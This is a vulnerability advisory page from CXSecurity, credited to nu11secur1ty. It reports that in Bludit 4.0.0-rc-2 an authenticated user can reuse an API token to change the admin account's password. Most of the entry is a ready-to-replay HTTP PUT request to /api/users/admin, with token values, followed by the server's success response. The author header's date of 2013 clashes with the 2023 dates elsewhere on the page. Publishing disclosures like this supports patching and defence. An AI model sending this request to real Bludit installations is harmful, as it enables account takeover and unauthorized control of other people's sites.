---
title: Bludit 4.0.0-rc-2 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023040048
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-12
fetch_date: 2025-10-04T11:29:17.444790
---

# Bludit 4.0.0-rc-2 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Bludit 4.0.0-rc-2 Privilege Escalation** **2023.04.11**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

## Title: Bludit-4.0.0-rc-2 - Release candidate 2 Account takeover:
API token vulnerability
## Author: nu11secur1ty
## Date: 04.11.2013
## Vendor: https://www.bludit.com/
## Software: https://github.com/bludit/bludit/releases/tag/4.0.0-rc-2
## Reference: https://www.cloudflare.com/learning/access-management/account-takeover/
## Reference: https://portswigger.net/daily-swig/facebook-account-takeover-researcher-scoops-40k-bug-bounty-for-chained-exploit
## Description:
The already authenticated attacker can send a normal request to change
his password and then he can use
the same JSON `object` and the vulnerable `API token KEY` in the same
request to change the admin account password.
Then he can access the admin account and he can do very malicious stuff.
STATUS: HIGH Vulnerability
[+]Exploit:
```PUT
PUT /api/users/admin HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 138
sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50
Safari/537.36
content-type: application/json
Accept: \*/\*
Origin: http://127.0.0.1:8000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8000/admin/edit-user/pwned
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: BLUDIT-KEY=98t31p2g0i7t6rscufuccpthui
Connection: close
{"token":"4f8df9f64e84fa4562ec3a604bf7985c","authentication":"6d1a5510a53f9d89325b0cd56a2855a9","username":"pwned","password":"password1"}
```
[+]Response:
```HTTP
HTTP/1.1 200 OK
Host: 127.0.0.1:8000
Date: Tue, 11 Apr 2023 08:33:51 GMT
Connection: close
X-Powered-By: PHP/7.4.30
Access-Control-Allow-Origin: \*
Content-Type: application/json
{"status":"0","message":"User edited.","data":{"key":"admin"}}
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/bludit/2023/Bludit-v4.0.0-Release-candidate-2)
## Proof and Exploit:
[href](https://streamable.com/w3aa4d)
## Time spend:
00:57:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040048)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top